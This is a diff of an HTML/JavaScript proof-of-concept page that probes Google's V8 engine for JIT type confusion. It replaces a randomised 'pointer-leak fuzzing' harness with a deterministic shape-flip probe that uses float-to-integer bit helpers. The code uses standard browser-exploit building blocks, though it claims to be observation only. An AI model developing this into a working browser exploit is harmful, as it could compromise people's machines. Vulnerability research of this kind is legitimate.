@@ -1,99 +1,106 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>V8 Memory Leak PoC - Strong</title>
+<title>V8 Type-Confusion Style PoC (Deterministic)</title>
 
-<h2>V8 Memory Leak PoC - Strong (Read-Only)</h2>
+<h3>Signal: inconsistent element interpretation (no exploit)</h3>
 <pre id="log"></pre>
 
 <script>
 const log = m => {
-    document.getElementById("log").textContent += m + "\n";
-    console.log(m);
+  document.getElementById("log").textContent += m + "\n";
+  console.log(m);
 };
 
-// TARGET FUNCTION
-function vuln(a,i){ return a[i]+1.1; }
-
-// WARMUP
-function warmup(){
-    let arr = Array.from({length:50}, (_,i)=>i+0.5);
-    for(let j=0;j<150000;j++) vuln(arr,j%50);
-    return arr;
+// helpers (observe bit patterns, not for exploitation)
+function f2i(f) {
+  const buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = f;
+  return new BigUint64Array(buf)[0];
+}
+function i2f(i) {
+  const buf = new ArrayBuffer(8);
+  new BigUint64Array(buf)[0] = i;
+  return new Float64Array(buf)[0];
 }
 
-// AGGRESSIVE MUTATION
-function mutate(arr){
-    // create many holes
-    for(let i=0;i<15;i++) delete arr[i];
-    arr.length = 10;
-    arr[80] = 1.7976931348623157e+308; // extreme float
-    arr[2] = {x:1}; // force object kind
-
-    Object.defineProperty(arr,3,{
-        get(){
-            arr.push(Math.random()*1e5);
-            return 1.1;
-        }
-    });
-    return arr;
+// target kept simple
+function vuln(a, i) {
+  return a[i] + 1.1;
 }
 
-// PROXY BREAK ASSUMPTION
-function breakAssumption(a){
-    return new Proxy(a,{
-        get(t,p){
-            if(p==="length"){
-                for(let i=0;i<10;i++) t.push(Math.random()*1e5);
-            }
-            if(typeof p==="string" && !isNaN(p) && Math.random()<0.5){
-                t.push(Math.random()*1e5);
-            }
-            return Reflect.get(t,p);
-        },
-        set(t,p,v){
-            if(Math.random()<0.2) t.length+=5;
-            return Reflect.set(t,p,v);
-        }
-    });
+// warmup to get stable optimized path
+function warmup() {
+  const a = Array.from({length: 64}, (_, i) => i + 0.5); // doubles
+  for (let k = 0; k < 120000; k++) {
+    vuln(a, k & 63);
+  }
+  return a;
 }
 
-// TYPED ARRAYS BESAR
-let buf = new ArrayBuffer(0x40000); // 256KB
-let f64 = new Float64Array(buf);
+// deterministic shape change (no randomness)
+function shapeFlip(a) {
+  // create holes + shrink
+  for (let i = 0; i < 8; i++) delete a[i];
+  a.length = 16;
 
-// INIT PATTERN
-for(let i=0;i<f64.length;i++) f64[i] = 0x41414141 + i;
+  // force object element
+  a[2] = {x: 1};
 
-// CHECK POINTER-LEAK
-function checkTyped(){
-    for(let i=0;i<f64.length;i++){
-        let v = f64[i];
-        if(Math.abs(v)>1e12){
-            log(`[POINTER-LEAK] idx=${i} val=${v}`);
-        }
+  // side-effectful getter (deterministic)
+  Object.defineProperty(a, 3, {
+    get() {
+      // controlled growth, no randomness
+      a.push(13.37);
+      a.push(14.47);
+      return 1.1;
     }
+  });
+
+  return a;
 }
 
-// MAIN LOOP
-function run(){
-    log("[*] warmup / JIT");
-    let base = warmup();
+// observation buffer (separate, just for stable readings)
+const buf = new ArrayBuffer(0x1000);
+const f64 = new Float64Array(buf);
+for (let i = 0; i < f64.length; i++) f64[i] = i + 0.5;
 
-    log("[*] starting pointer-leak fuzzing...");
-    for(let i=0;i<300000;i++){
-        let arr = [...base];
-        arr = mutate(arr);
-        arr = breakAssumption(arr);
-
-        vuln(arr,5);
-
-        // overlay extreme float
-        f64[i % f64.length] = 1.7976931348623157e+308;
-
-        if(i%2000===0) checkTyped();
-        if(i%1000===0) log(`iter ${i}`);
+function checkSignals(tag, a) {
+  // read a few fixed indices only (deterministic)
+  const idxs = [0,1,2,3,4,5,10,12];
+  for (const i of idxs) {
+    const v = a[i];
+    if (typeof v === "number") {
+      const bits = f2i(v).toString(16);
+      // look for non-canonical double patterns (heuristic signal)
+      if (!Number.isFinite(v) || (bits.startsWith("7ff") && !Number.isNaN(v))) {
+        log(`[${tag}] suspicious number @${i} = ${v} bits=0x${bits}`);
+      }
+    } else if (typeof v === "object") {
+      log(`[${tag}] object seen @${i}`);
+    } else {
+      log(`[${tag}] type=${typeof v} @${i}`);
     }
-    log("[*] done - pointer leak scan finished");
+  }
+}
+
+function run() {
+  log("[*] warmup");
+  const base = warmup();
+
+  log("[*] prepare copy");
+  const a = base.slice();
+
+  log("[*] flip shape deterministically");
+  shapeFlip(a);
+
+  log("[*] trigger optimized path");
+  // fixed sequence (no random)
+  for (let i = 0; i < 32; i++) vuln(a, i & 15);
+
+  log("[*] observe signals");
+  checkSignals("post-trigger", a);
+
+  log("[*] done");
 }
 
 run();
